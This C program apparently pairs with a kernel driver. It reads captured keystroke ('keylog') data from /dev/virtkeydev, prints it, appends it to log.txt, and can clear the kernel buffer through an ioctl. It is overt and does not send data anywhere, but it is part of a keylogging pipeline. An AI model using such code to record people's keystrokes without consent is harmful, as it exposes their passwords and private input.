#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <signal.h>

#define IOCTL_CLEAR _IO('k', 1)

volatile int running = 1;

struct thread_args {
    int dev_fd;
    int *last_len;
};

// Reader thread: reads new keylog data and appends to file using system calls
void *reader_thread(void *arg) {
    struct thread_args *args = (struct thread_args *)arg;
    int dev_fd = args->dev_fd;
    int *last_len = args->last_len;

    int log_fd = open("log.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (log_fd < 0) {
        perror("Failed to open log.txt");
        return NULL;
    }

    while (running) {
        char buf[4096];
        int len = read(dev_fd, buf, sizeof(buf) - 1);
        if (len > 0) {
            buf[len] = '\0';
            if (len > *last_len) {
                dprintf(STDOUT_FILENO, "%s", buf + *last_len);
                if (write(log_fd, buf + *last_len, len - *last_len) < 0)
                    perror("write to log.txt failed");
                *last_len = len;
            }
        }
        sleep(1);
    }

    close(log_fd);
    return NULL;
}

// Clearer thread: handles IOCTL_CLEAR command from user input
void *clearer_thread(void *arg) {
    struct thread_args *args = (struct thread_args *)arg;
    int dev_fd = args->dev_fd;
    int *last_len = args->last_len;

    char cmd[16];
    while (running) {
        dprintf(STDOUT_FILENO, "[INPUT] Type `clear` to reset buffer:\n> ");
        if (fgets(cmd, sizeof(cmd), stdin) && strncmp(cmd, "clear", 5) == 0) {
            dprintf(STDOUT_FILENO, "Sending IOCTL_CLEAR...\n");
            if (ioctl(dev_fd, IOCTL_CLEAR) < 0)
                perror("IOCTL_CLEAR failed");
            else {
                dprintf(STDOUT_FILENO, "Kernel buffer cleared.\n");
                *last_len = 0;
            }
        }
    }
    return NULL;
}

// Controller thread: handles program exit
void *controller_thread(void *arg) {
    char cmd[16];
    while (running) {
        dprintf(STDOUT_FILENO, "[INPUT] Type `exit` to stop program:\n> ");
        if (fgets(cmd, sizeof(cmd), stdin) && strncmp(cmd, "exit", 4) == 0) {
            running = 0;
            break;
        }
    }
    return NULL;
}

int main() {
    pthread_t t_reader, t_clearer, t_controller;
    int last_len = 0;

    int dev_fd = open("/dev/virtkeydev", O_RDWR);
    if (dev_fd < 0) {
        perror("Failed to open /dev/virtkeydev");
        return 1;
    }

    printf("Starting The Reading /dev/virtal_key \n");
    struct thread_args args = {
        .dev_fd = dev_fd,
        .last_len = &last_len
    };


    pthread_create(&t_reader, NULL, reader_thread, &args);
    pthread_create(&t_clearer, NULL, clearer_thread, &args);
    pthread_create(&t_controller, NULL, controller_thread, NULL);

    pthread_join(t_controller, NULL);

    // Stop other threads
    pthread_cancel(t_reader);
    pthread_cancel(t_clearer);
    pthread_join(t_reader, NULL);
    pthread_join(t_clearer, NULL);

    close(dev_fd);
    dprintf(STDOUT_FILENO, "Exiting program. All threads terminated.\n");
    return 0;
}

